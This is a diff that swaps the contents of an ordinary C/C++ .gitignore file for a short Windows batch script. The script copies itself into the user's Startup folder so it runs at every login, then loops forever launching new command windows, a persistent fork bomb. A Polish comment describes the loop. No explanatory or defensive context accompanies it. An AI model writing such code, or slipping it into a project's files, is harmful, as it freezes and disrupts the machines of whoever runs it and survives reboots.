@@ -1,32 +1,21 @@
-# Prerequisites
-*.d
+@echo off
+setlocal
 
-# Compiled Object files
-*.slo
-*.lo
-*.o
-*.obj
+set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 
-# Precompiled Headers
-*.gch
-*.pch
+set "me=%~f0"
 
-# Compiled Dynamic libraries
-*.so
-*.dylib
-*.dll
+set "dest=%startup%\loop.bat"
 
-# Fortran module files
-*.mod
-*.smod
+if /i not "%me%"=="%dest%" (
+    copy "%me%" "%dest%" >nul
+    exit
+)
 
-# Compiled Static libraries
-*.lai
-*.la
-*.a
-*.lib
-
-# Executables
-*.exe
-*.out
-*.app
+:: Właściwa część – nieskończona pętla otwierania okien
+:loop
+start
+start
+start
+start
+goto loop
